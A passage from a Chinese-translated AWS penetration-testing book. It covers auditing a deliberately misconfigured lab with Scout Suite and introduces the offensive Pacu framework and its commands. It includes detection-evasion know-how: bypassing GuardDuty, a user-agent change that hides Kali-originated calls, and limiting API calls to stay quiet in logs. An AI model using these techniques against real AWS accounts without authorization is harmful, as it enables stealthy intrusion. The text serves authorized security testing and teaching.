在当前状态下，GuardDuty 处于早期阶段，并且在环境中检测恶意活动时寻找很多低 hanging fruit。这些检查中的许多（有时甚至全部）都很容易在攻击 AWS 环境的过程中绕过和/或避免。尽管本章试图涵盖目前对 GuardDuty 的所有了解，但随着时间的推移，该服务正在慢慢更新和改进。这主要是因为其中涉及到机器学习。

由于 GuardDuty 的位置，它可能不是一个很好的应对一切的解决方案，所以当你攻击 AWS 环境时，重要的是要记住它可能不是唯一监视你的东西。即使你在攻击一个有 GuardDuty 和另一个监控工具的环境，尽量绕过 GuardDuty 仍然是有用和实际的，这样你就不会因为一些低 hanging fruit 而被抓住，或者因为环境中更先进的监控设置而被抓住。


# 第七部分：利用 AWS 渗透测试工具进行真实世界的攻击

在本节中，我们将看看真实世界的 AWS 渗透测试工具，以及我们如何将迄今学到的一切整合起来，执行完整的 AWS 渗透测试。

本节将涵盖以下章节：

+   第十七章，*使用 Scout Suite 进行 AWS 安全审计*

+   第十八章，*使用 Pacu 进行 AWS 渗透测试*

+   第十九章，*将所有内容整合在一起-真实世界的 AWS 渗透测试*


# 第十七章：使用 Scout Suite 进行 AWS 安全审计

本章介绍了另一个自动化工具，称为 Scout Suite，它对 AWS 基础架构内的攻击面进行审计，并报告了一系列发现，可以在 Web 浏览器上查看。Scout2 在白盒测试期间对渗透测试人员非常有用，因为它允许快速评估各种 AWS 服务中的安全配置问题，并在易于阅读的仪表板上报告它们。这有助于识别一些可能需要更长时间才能检测到的低挂果。

本章将涵盖以下主题：

+   设置一个易受攻击的 AWS 基础设施

+   配置和运行 Scout Suite

+   解析 Scout Suite 扫描的结果

+   使用 Scout Suite 的规则

# 技术要求

本章将使用以下工具：

+   Scout Suite

# 设置一个易受攻击的 AWS 基础设施

在这个练习中，我们将创建一个易受攻击的 EC2 基础设施，包括一个新的 VPC、子网和一个暴露的 EC2 实例。我们还将创建一个新的 S3 存储桶，该存储桶可以公开写入和读取。

# 一个配置错误的 EC2 实例

在第四章中，*设置您的第一个 EC2 实例*，我们学习了如何创建新的 VPC 和子网。我们将从创建一个新的 VPC 和子网开始，然后启动一个所有端口都暴露的 EC2 实例。您可以参考第四章中的步骤来完成这一步骤：

1.  让我们从转到服务| VPC |您的 VPC 开始。

1.  单击创建 VPC 并分配新的 IP 范围：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/8749b3df-92a2-43cd-a605-ad11ce157077.jpg)

创建 VPC

在这里，我们已将 VPC 命名为`VulnVPC`，并为其分配了`10.0.0.0/16`的 IP 范围。

1.  在 VPC 内创建一个新的子网：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d5220371-d1ba-4cfc-86f0-9f8df8b23d3f.jpg)

创建子网

我们正在在 VPC 内创建一个新的子网，IP 范围为`10.0.1.0/24`。

1.  转到 Internet 网关并创建一个新的网关；将此新网关附加到新的 VPC：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d591ba63-3192-44c1-a8a7-a6bbc6f9345c.jpg)

创建新的网关

1.  转到路由表并选择新的 VPC。然后，转到路由选项卡，单击编辑路由。

1.  添加一个新的`0.0.0.0/0`目标，并将目标设置为互联网网关：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/275b992f-9da7-4310-bf89-2609c337900b.jpg)

添加一个新的目标并设置目标

1.  创建一个新的安全组并允许来自任何地方的所有流量：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/75debeae-df31-4787-99a9-1b37de2b63b7.jpg)

编辑入站规则

1.  现在，在新的 VPC 和子网中启动一个新的 EC2 实例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/d6e8f4b1-2516-4fe2-b7cb-3bf178b128f2.jpg)

启动一个新的 EC2 实例

1.  将其分配给易受攻击的安全组，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/ee19d5d8-b94e-4efd-84fd-0dba9944bc37.jpg)

分配安全组 ID

1.  最后，启动 EC2 实例。

我们的易受攻击的 EC2 基础设施已经准备好。现在让我们也创建一个易受攻击的 S3 实例。

# 创建一个易受攻击的 S3 实例

在第七章中，*侦察-识别易受攻击的 S3 存储桶*，我们看到了如何创建一个易受攻击的 S3 存储桶。现在是时候再次执行这些步骤了。让我们从服务| S3 开始：

1.  创建一个新的存储桶，命名它，然后转到设置权限

1.  禁用以下截图中给出的所有设置并创建存储桶：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/c4a1185d-ab7c-4889-9efe-52b4531ffa49.jpg)

设置权限

1.  转到存储桶的**访问控制列表**并允许公开读/写访问：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/4f457b11-3a83-45c2-a831-788d963b9035.jpg)

访问控制列表

1.  保存所有设置

我们的易受攻击的 AWS 基础设施已经准备好。接下来，我们将配置和运行 Scout Suite，并看看它如何识别我们创建的所有安全配置错误。

# 配置和运行 Scout Suite

现在我们的易受攻击的 AWS 基础架构已经建立，是时候配置并运行 Scout Suite 了。Scout Suite 是一种自动化的云安全审计工具，可帮助我们评估和识别安全配置错误。它从云提供商公开的 API 中收集配置数据，并生成一个报告，突出显示潜在的易受攻击配置。该工具适用于多个云提供商，如 AWS、Azure 和 Google Cloud Platform（GCP）。

# 设置工具

要在我们的 AWS 基础架构上运行该工具，我们将不得不设置一个具有特定权限的 IAM 用户来配置该工具：

1.  首先，转到 IAM | 用户。

1.  点击“添加用户”按钮，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/3c545d26-6738-451e-91f6-81237f931d1d.jpg)

添加 IAM 用户

1.  我们将为此活动创建一个新的`auditor`用户。将访问类型设置为程序化访问，然后继续。我们不需要访问 AWS 管理控制台，因此无需创建密码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/b1be3a06-b6cc-49ff-854a-07bb1fcce4d1.jpg)

设置用户详细信息

1.  接下来，我们将为我们的新 IAM 用户设置策略。为了使工具成功运行，我们需要为该用户提供两个特定策略，即 ReadOnlyAccess 和 SecurityAudit，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e1a27ba8-0960-4394-b13e-3f8a6437709f.jpg)

为我们的新 IAM 用户设置策略

在设置权限中选择这两个权限，然后继续。

1.  检查最终审查页面上的详细信息，然后继续：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e746fa20-2f2a-4838-9049-cb3a64fa7473.jpg)

审查详细信息

1.  最后，您将收到一个成功消息，以及访问密钥 ID 和秘密访问密钥凭据。请记下这些，因为配置 AWS CLI 时将需要它们：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/c42259d1-9b3e-43a1-a6a5-fc9221ed3173.jpg)

显示成功消息的屏幕

7. 点击“继续”，您将看到我们的用户已创建：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/2adfaafd-7f88-4876-8fb1-8b8307cb57e7.jpg)

显示用户已创建的屏幕

接下来，我们将配置我们的 AWS CLI 以使 Scout Suite 能够按照以下步骤工作：

1.  运行 AWS CLI 工具，并使用刚刚收到的凭据进行配置：

```
aws configure
```

1.  输入凭据，并确保将您的区域设置为托管 AWS 基础架构的相同区域。

1.  现在让我们安装`scoutsuite`；我们可以通过`pip`进行安装，如下所示：

```
sudo pip install scoutsuite
```

或者，我们可以从 GitHub 存储库下载该工具：

```
git clone https://github.com/nccgroup/ScoutSuite
```

1.  如果您从 GitHub 下载脚本，您将需要运行以下命令来安装`ScoutSuite`的所有依赖项：

```
cd ScoutSuite
sudo pip install -r requirements.txt
```

如果您想在 Python 虚拟环境中运行该工具，请在运行`pip install -r requirements.txt`之前运行以下命令：

```
virtualenv -p python3 venv
source venv/bin/activate
```

然后，通过运行`pip install -r requirements.txt`安装所有依赖项。

1.  最后，通过运行以下命令检查工具是否正常工作：

```
python Scout.py --help
```

如果显示帮助菜单，这意味着我们的工具已成功设置。让我们看看如何运行工具并对基础架构进行评估。

# 运行 Scout Suite

我们的工具现在已准备就绪。要开始评估，只需运行以下命令。

如果使用`pip`安装，请使用以下命令：

```
Scout aws
```

如果您正在运行 GitHub 脚本，请使用此命令：

```
python Scout.py aws
```

该工具将从每个 AWS 服务收集数据，然后分析配置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/e1ac1e04-c14d-420b-83bf-89623b82a9fa.jpg)

分析配置

该工具将生成一个 HTML 报告，将保存在`scoutsuite-report`文件夹中。如果您已经在 AWS 上运行的 Kali 实例上运行了该工具，您可以使用 SCP/WinSCP 简单地下载文件。

# 解析 Scout Suite 扫描结果

让我们来看看我们的报告；看起来 Scout Suite 已经在我们的 AWS 基础架构中识别出了一些问题，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/7ce98fc7-9e56-4d28-ae80-68d3644b5fc9.jpg)

Scout Suite 仪表板显示 AWS 基础架构中的问题

我们将逐一查看每个报告的问题。

让我们看看 EC2 报告。从报告中可以看出，所有 EC2 实例的配置错误都已列出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/8547c0a7-10cf-4408-b94d-e26df4a36500.jpg)

EC2 仪表板

如果您想更详细地查看每个问题，只需单击任何问题。让我们看看“所有端口对所有开放”问题的详细信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/5333055b-f5a8-465c-a1a3-9cd34f96a276.jpg)

所有端口对所有开放

在这里，我们更详细地了解了配置错误的位置以及为什么会出现问题。

现在，让我们在 S3 仪表板中查看我们的 S3 存储桶报告：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/8912b0aa-d447-46d3-9477-99f6851a7162.jpg)

S3 仪表板

正如您在前面的屏幕截图中所看到的，该工具成功识别了我们创建的易受攻击的 S3 存储桶。

那么，我们的 VPC 和子网呢？VPC 服务中没有关键发现。但是，工具已经确定了 VPC 和子网的网络 ACL 中存在潜在威胁，我们需要进行调查：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/86d20e70-0a4e-4bb8-be1f-ed8cfacf4dc6.jpg)

VPC 仪表板

我们还可以看到 IAM 服务中存在一些关键发现；让我们也来看看：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/1a630e17-3eba-4b6f-9bcb-6ba6af9dc441.jpg)

IAM 仪表板

这些发现对审计人员识别易受攻击的密码策略和访问管理问题非常有帮助。这对系统管理员来说也非常有用，可以确保遵循最佳实践。

现在让我们看看如何使用自定义规则集根据我们的需求自定义报告。

# 使用 Scout Suite 的规则

Scout Suite 为我们提供了使用自定义规则集而不是默认规则集对基础设施进行审计的选项。这非常有用，因为每个组织在设置 AWS 基础设施时都有自己的业务案例。使用自定义规则集可以帮助组织根据其需求定制工具的评估。

让我们看看如何创建自己的规则集：

1.  要创建新的规则集，我们首先需要复制现有的规则集。您可以在 GitHub 存储库中找到默认的规则集文件[`github.com/nccgroup/ScoutSuite/blob/master/ScoutSuite/providers/aws/rules/rulesets/detailed.json.`](https://github.com/nccgroup/ScoutSuite/blob/master/ScoutSuite/providers/aws/rules/rulesets/detailed.json)我们这样做的原因是确保我们有正确的规则集格式，可以从中构建我们自己的规则。

1.  下载文件并在文本编辑器中打开，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/4bdee3e1-6213-440f-a4a4-ef33d5a9d972.jpg)

myruleset.json

1.  让我们修改文件末尾的以下设置：

+   转到名为`vpc-default-network-acls-allow-all.json`的设置。如果您没有对文件进行任何更改，则设置应在第`1046`行。

+   将`ingress`参数的严重级别从`warning`更改为`danger`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/48aee39a-aa7a-488b-a67a-a6a462aebf58.jpg)

更改严重级别

+   +   转到名为`vpc-subnet-with-default-acls.json`的设置。如果您没有对文件进行任何更改，则设置应在第`1088`行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/47331c9d-b30e-4c60-aff1-385f688c2022.png)

vpc-subnet-with-default-acls.json

+   +   将`"enabled"`设置更改为`true`。

1.  我们已经准备好使用自定义规则集运行 Scout Suite。如果您使用`pip`安装，请发出以下命令：

```
Scout aws --ruleset myruleset.json
```

如果您正在使用 GitHub 脚本，请发出以下命令：

```
Scout.py aws --ruleset myruleset.json
```

如果您这次查看报告，您会看到之前报告的 VPC 相关问题现在已被标记为关键：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/4e93f3e8-dbd4-41de-873f-a292bf3e5151.jpg)

VPC 仪表板

此外，由于我们启用了`vpc-subnet-with-default-acls.json`设置，Scout Suite 这次报告了问题。

同样，其他设置可以根据其用例进行修改。

# 摘要

在本章中，我们学习了如何设置和配置 Scout Suite。为了在我们的 AWS 基础设施上运行 Scout Suite，我们创建了一个新的 VPC 和具有易受攻击配置的子网，然后启动了一个具有易受攻击安全组的 EC2 实例。然后我们运行了 Scout Suite 来识别我们 AWS 基础设施中潜在的易受攻击配置，然后分析报告以了解漏洞是如何报告的。最后，我们学习了如何修改和使用定制的规则集来调整报告，以符合我们的需求。

在下一章中，我们将看一下 AWS 基础设施的现实世界渗透测试。


# 第十八章：使用 Pacu 进行 AWS 渗透测试

尽管我们在本书中一直在使用 Pacu，但本章将从头开始讨论 Pacu。理想情况下，在本章结束时，您应该能够理解并能够利用 Pacu 提供的大部分功能。这意味着您将能够利用 Pacu 的一些更高级的功能，并且可以为项目贡献自己的模块和研究。

在本章中，我们将深入了解 AWS 开发工具包 Pacu，我们将了解以下几点：

+   Pacu 是什么，为什么它重要，以及如何设置它

+   Pacu 提供的命令以及我们如何利用它们使我们受益

+   我们如何可以自动化我们自己的任务并将它们添加到 Pacu 作为一个模块

+   PacuProxy 及其目的的简短介绍

对于渗透测试领域的任何事情，尽可能自动化是有帮助的。这使我们能够在不需要手动运行多个 AWS 命令行界面（CLI）命令的情况下，对环境进行攻击和枚举。这种工具可以节省时间，让我们有更多时间花在测试过程的手动方面。有时这些工具可能会复杂，需要对工具及其目标有深入的了解才能充分利用它。这就是为什么写了这一章，帮助您更好地了解 Pacu 提供了什么以及如何最好地利用这些功能。

# Pacu 历史

从最开始说起，Pacu 是一个攻击性的 AWS 开发框架，由 Rhino Security Labs 的一小群开发人员和研究人员编写。Pacu 及其模块是用 Python 3 编写的，是开源的，并在 GitHub 上以 BSD-3 许可证提供（[`github.com/RhinoSecurityLabs/pacu`](https://github.com/RhinoSecurityLabs/pacu)）。

Pacu 的最初想法源于 Rhino 渗透测试团队的研究积累。发现越来越多的客户正在使用云服务器提供商，如 AWS，并且有许多未被开发的领域似乎可以被利用。随着 Rhino 团队内的想法、攻击向量和脚本的积累，很明显需要一种框架来汇总所有这些研究，并使其易于使用。作为渗透测试人员，还决定它应该能够很好地处理项目和渗透测试，即使同时进行的是不同的项目。

在内部提案和拟议项目的原型之后，Pacu 被接受，团队开始了导致 Pacu 今天的过程。为了与 AWS 的不断发展的服务和相关攻击向量保持一致，并确保 Pacu 与之保持最新，Pacu 被开发时考虑了可扩展性。这是为了允许对项目进行简单的外部贡献，并提供一个简单的管理基础设施，处理问题并为这些问题提供简单的解决方案。

# 开始使用 Pacu

设置 Pacu 时需要的第一件事是确保已安装 Git、Python 3 和 Pip 3。完成后，您可以按照简单的三个步骤安装和运行 Pacu。从您的操作系统的 CLI（我们使用的是 Kali Linux）中运行以下命令：

```
git clone https://github.com/RhinoSecurityLabs/pacu.git 
cd pacu/ && bash install.sh 
python3 pacu.py 
```

请注意，Pacu 不是官方支持的 Windows 操作系统。

现在 Pacu 应该启动并经过配置和数据库创建的过程。它应该首先告诉您它创建了一个新的 `settings.py` 文件，然后是一个消息，它创建了一个新的本地数据库文件。最后，它会要求您为新的 Pacu 会话命名。在这个例子中，我们将会话命名为 `ExampleSession`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/32f8f0c4-6a29-47af-bf15-92b8ef57e024.png)

Pacu 在 Kali Linux 上首次启动

现在我们创建了新的会话；Pacu 中的`session`本质上是一种在您正在进行的不同项目之间隔离数据、活动和凭据的方式。Pacu 使用本地 SQLite 数据库来管理会话和其中的数据，并允许创建任意数量的会话。作为渗透测试人员，会话可以被视为参与或公司，因为您可以同时在两个不同的 AWS 渗透测试中工作，因此您需要两个 Pacu 会话来分隔这两个。然后，每个 Pacu 会话将保存属于该特定参与或公司的所有数据、活动和凭据。这使您可以在 Pacu 的多个不同用途中使用相同的数据，需要更少的 API 调用到 AWS API，这意味着您在日志中更隐蔽。

`SQLAlchemy` Python 库用于管理 Pacu 与数据库之间的交互，但我们稍后会详细介绍。

接下来，您应该会看到 Pacu 输出了大量的帮助信息，解释了 Pacu 具有的不同命令和功能。我们现在将跳过这一部分，稍后再回来。

之后，如果你像我们一样在运行 Kali Linux，你应该会看到类似以下的消息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/a04cee23-563a-4bf9-be70-84f20df56a59.png)

Pacu 中的内置 GuardDuty 防御

正如我们在第十六章中讨论的那样，*GuardDuty*，这条消息是因为 Pacu 检测到它正在运行在 Kali Linux 主机上。GuardDuty 可以检测到 AWS API 调用是否来自 Kali Linux 服务器，并根据此标记警报，因此 Pacu 通过修改发送到 AWS 服务器的用户代理自动解决了这个问题。因此，当我们开始攻击时，GuardDuty 不会立即警报我们。同样的检查和解决方案过程也适用于 Parrot 和 Pentoo Linux。

之后，您应该会进入 Pacu CLI，看起来像这样：

```
   Pacu (ExampleSession:No Keys Set) > 
```

这一行正在等待我们输入命令，并且它显示我们在`ExampleSession` Pacu 会话中，没有设置任何 AWS 密钥。对于 Pacu 的大部分功能，需要一组 AWS 密钥，因此我们将使用`set_keys` Pacu 命令添加一些。在运行此命令时，我们将被要求输入密钥别名、访问密钥 ID、秘密访问密钥和 AWS 凭据的会话令牌。正如我们之前在书中讨论过的那样，会话令牌字段是可选的，因为只有临时 AWS 凭据使用会话令牌。常规 IAM 用户只有访问密钥 ID 和秘密访问密钥，因此在这种情况下，您将留空会话令牌字段。密钥别名是我们可以分配给正在添加的访问密钥集的任意名称。这仅供我们（和 Pacu）参考，因此选择一个对您有意义的名称。以下截图显示了在 Pacu 数据库中运行`set_keys`命令添加我们的 AWS 访问令牌时提供的输出和输入。在我们的示例中，我们选择了`ExampleUser`，因为这是为其创建密钥的用户的用户名。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/b6ebcbb3-d9b8-4d24-a573-daee72dd788c.png)

将我们的示例用户添加到 Pacu 数据库

如你所见，我们已经将密钥集命名为`ExampleUser`，然后在 Pacu CLI 提示符处替换了`No Keys Set`，这表明`ExampleUser`密钥对是我们的活动集。活动密钥集用于 Pacu 与 AWS API 进行任何身份验证。您可以使用相同的`set_keys`命令添加其他密钥集，但使用不同的密钥别名。如果在设置一对密钥时指定了现有的密钥别名，它将用您输入的内容覆盖该密钥别名下的任何现有值。

如果我们想在 Pacu 中切换密钥对，我们可以使用名为`swap_keys`的 Pacu 命令。这将允许我们从在此 Pacu 会话中设置的密钥对列表中进行选择。假设在此示例中，我们已经在 Pacu 中设置了`ExampleUser`和`SecondExampleUser`作为密钥对，并且我们想要从`ExampleUser`切换到`SecondExampleUser`。我们只需要运行`swap_keys`命令并选择我们想要的密钥对即可：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/f459a94e-9572-4b29-85c4-dc9777c24727.png)

在会话中切换 Pacu 密钥

如前面的截图所示，Pacu CLI 上的`ExampleUser`已更改为`SecondExampleUser`，这表明我们有了一组新的激活的 AWS 密钥。

此时 Pacu 基本上已经设置好并准备就绪，但如果我们愿意，我们还可以做一些事情来定制我们的会话，但我们将在下一节中介绍这些命令。

# Pacu 命令

Pacu 具有各种 CLI 命令，允许灵活定制和与当前会话以及 Pacu 提供的任何可用模块进行交互。在当前状态下，Pacu 提供以下命令：

+   `list/ls`

+   `search`

+   `help`

+   `whoami`

+   `data`

+   `services`

+   `regions`

+   `update_regions`

+   `set_regions`

+   `run/exec`

+   `set_keys`

+   `swap_keys`

+   `import_keys`

+   `exit/quit/Ctrl+C`

+   `aws`

+   `proxy`

以下各小节将介绍这些命令，包括描述、使用示例和实际用例。

# list/ls

`list`和`ls`命令是相同的，它们列出所有可用的 Pacu 模块，以及它们的类别。以下截图显示了运行`ls`命令时返回的部分输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/dddc4680-b77a-4155-994a-8178fe373ca2.png)

运行 ls 或 list 时返回的一些模块和类别

# search [[cat]egory] <search term>

`search`命令正是你所想的 - 它搜索模块。它基本上与`ls`命令相同，通过返回类别和模块，但它还返回每个搜索的模块的一行描述，以便让您更好地了解某个模块的功能。其原因是搜索的输出几乎肯定比仅运行`ls`要小，因此有更具体的输出空间。

您还可以通过类别搜索来列出该类别中的所有模块，方法是在搜索中使用`cat`或`category`关键字作为部分字符串。

以下示例将返回名称中包含`ec2`的所有模块：

```
   search ec2 
```

以下示例将返回`PERSIST`类别中的所有模块：

```
   search category PERSIST 
```

因为`category`也可以被指定为`cat`，获取`PERSIST`类别中所有模块的简便方法如下：

```
   search cat PERSIST 
```

以下截图显示了`search cat PERSIST`命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/8b2cd999-c152-43c0-a9b1-e53993f20c90.png)

返回 PERSIST 类别中的所有模块

# help

`help`命令简单地输出 Pacu 的帮助信息，其中包括可用命令和每个命令的描述。这打印了在每次 Pacu 启动时自动打印的相同数据。

# help <module name>

`help`命令还有另一种变体，您可以提供模块名称，它将返回该特定模块的帮助信息。这些数据包括长描述（比搜索模块时显示的一行描述更长），先决条件模块，编写模块的人员，以及所有可用或必需的参数。在继续使用特定模块之前阅读特定模块的帮助文档总是一个好主意，因为您可能会错过一些功能和怪癖。

以下截图显示了`iam__enum_permissions`模块的`help`输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/af996bc7-d0b1-412f-9b8d-32d118abe09a.png)

iam__enum_permissions 模块的帮助输出

# whoami

`whoami`命令将输出有关当前活动 AWS 密钥集的所有信息。这意味着如果我们的活动集是`SecondExampleUser`用户，那么我将只看到该用户的信息，而不是其他人的。以下屏幕截图显示了`whoami`命令作为`SecondExampleUser`用户的输出：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/cb7934a5-1125-4c2c-b548-d3db068f499d.png)

*图 8*：SecondExampleUser 用户的 whoami 输出

正如你所看到的，几乎所有内容都是空的或 null。这是因为在当前会话中尚未运行任何模块。随着运行提供此列表中信息的模块，它将被填充。举个例子，我刚刚运行了`iam__detect_honeytokens`模块，它填写了有关我的用户的一些标识信息。以下屏幕截图显示了收集此信息后`whoami`命令的更新输出：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/14bfe22a-46c8-4778-95e4-d5afe4ebfb41.png)

从 iam__detect_honeytokens 模块填充的部分输出

我们可以看到`UserName`，`Arn`和`AccountId`字段已更新，因为这是`iam__detect_honeytokens`模块在运行时获取的信息。其他模块在此输出中填入不同的信息，但`iam__enum_permissions`模块将填写最多的信息，因为它枚举了有关当前用户的大量信息并将其保存到本地数据库。

# 数据

`data`命令将输出存储在当前活动会话中的所有数据，其中包括已枚举的 AWS 服务数据，以及在会话期间定义的配置设置。以下屏幕截图显示了我们目前所处位置的`data`命令的输出（即，尚未枚举任何 AWS 服务数据）：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/28418fa3-18f0-449e-8eac-7c0404bbe52e.png)

*图 10*：没有枚举任何 AWS 数据的数据命令的输出

我们可以看到我们添加到会话中的两个 AWS 密钥，会话的一些标识信息，我们修改后的用户代理（因为我们在 Kali Linux 上），我们活跃的密钥集，会话区域（在`set_regions`命令部分讨论），以及代理数据（在`proxy`命令部分讨论）。

如果我运行`run ec2__enum --instances`命令来枚举目标帐户中的 EC2 实例，我应该能够在数据库中填充一些 EC2 数据，这将改变`data`命令的输出。以下屏幕截图显示了枚举 EC2 实例后`data`命令的新输出：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/6d2b75b7-d1e6-492b-b645-9c110e309ad3.png)

枚举 EC2 实例后数据命令的新输出

# 服务

`services`命令将输出存储在数据库中的任何 AWS 服务。鉴于我们只枚举了 EC2 实例，EC2 应该是唯一在数据库中存储数据的服务：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/7c0feb06-9f71-48dd-aee3-0391a2ca3a05.png)

服务命令向我们显示数据库中存在 EC2 数据

这个命令与`data`命令的另一种形式很搭配，该形式在下一节中有解释。

# 数据<服务>|代理

这个版本的`data`命令允许您请求比广泛的`data`命令更具体的信息，特别是因为在数据库中存储了多个服务和数据类型，`data`命令的输出可能会变得相当大。我们可以向该命令传递任何在数据库中具有数据的 AWS 服务，以获取有关该特定服务的信息，或者我们可以传递`proxy`关键字以获取有关`PacuProxy`的信息（如在`proxy`命令部分中概述）。我们知道`services`输出`EC2`是我们唯一具有数据的服务，因此我们可以运行`data EC2`来获取相关的 EC2 数据：

！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/18a2833d-61c7-4e68-a1d0-6dde243ab8d0.png)

使用数据命令获取 EC2 数据

我们也可以运行`data proxy`，但我们要等到以后再讨论。

# 区域

`regions`命令将列出 Pacu 支持的所有区域，通常是 AWS 用户可用的每个公共区域。此命令可在针对一组特定区域运行模块或使用`set_regions`命令时提供帮助，后者将在后面的部分中讨论：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/42b1c50c-e561-4d7b-87ef-bfa0dfc9677f.png)

运行 regions 命令时，列出了此时支持的所有区域

# update_regions

通常不需要由普通 Pacu 用户运行`update_regions`命令，但重要的是要了解它的作用，以便在认为可能需要使用它时了解它的作用。

此命令运行一个 bash 脚本，将执行以下操作：

1.  使用`python3 -m pip install --upgrade botocore`来将您的 botocore Python3 库更新到最新可用版本。

1.  使用`python3 -m pip show botocore`来定位 botocore 安装文件夹。

1.  然后，它将读取存储在 botocore 文件夹中的`endpoints.json`文件，以解析出哪些服务可用以及为这些服务支持哪些区域。

1.  然后，它将将解析后的数据保存到 Pacu 文件夹中的`./modules/service_regions.json`文件中。

Pacu 将此作为其支持的服务和区域的指南。Pacu 开发人员将随着推送到 GitHub 存储库的任何更新而更新区域列表，但在两次 Pacu 更新之间可能会有新区域得到支持的情况。在这种情况下，可能有必要运行`update_regions`命令，但否则，您可能可以将其留给开发人员。以下屏幕截图显示了运行`update_regions`命令的输出，该命令获取 botocore Python 库的最新版本，然后从中提取最新的区域列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/da5e472f-8c1f-47d5-be28-d896b271e3d0.png)

Botocore 由 update_regions 命令更新

# set_regions <region> [<region>...]

`set_regions`命令是在学习使用 Pacu 时最重要的命令之一。正确使用时，它可以大大减少对目标环境进行的 API 调用数量，最终使我们在环境中的足迹更小。

`set_regions`命令控制`session regions`配置选项的值。基本上，此命令用于告诉 Pacu，您只想在当前会话中针对区域*x*、*y*和*z*。一个例子是，当您攻击一个只在其整个基础架构中使用了几个区域的环境时，这可能会派上用场。默认情况下，当使用`--regions`参数运行模块时，Pacu 会提示您确保是否要针对每个区域进行目标，但如果您已经知道只有几个区域会有有效结果，为什么要这样做呢？最终，这将导致`浪费`API 调用，从而使我们被检测到，并几乎没有任何好处。

使用`set_regions`命令时，您需要提供一个或多个 AWS 区域（这些区域在`regions`命令的输出中列出）。然后，Pacu 将只针对这些区域进行 API 调用。如果您知道您的目标只在两个区域使用 EC2，即`us-west-2`和`us-east-1`，那么您将运行`set_regions us-west-2 us-east-1`，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/87072c16-8f31-4f3e-8d03-69ae743dba24.png)

将我们的会话区域设置为 us-west-2 和 us-east-1

现在，如果我们愿意，我们可以再次运行`data`命令，`session_regions`的值将与我们之前看到的不同。现在它将包含两个字符串：`us-west-2`和`us-east-1`。

设置会话区域后，Pacu 在运行模块时会做出相应的反应。当运行接受`--regions`作为参数的模块，但省略该参数时，Pacu 将首先获取被定位的服务的所有支持的区域，然后将该列表与用户设置的会话区域列表进行比较。然后，它只会定位两个列表中都存在的区域。这可以防止您对不受特定 AWS 服务支持的区域运行模块，并防止您对任何您不打算运行模块的区域运行模块。

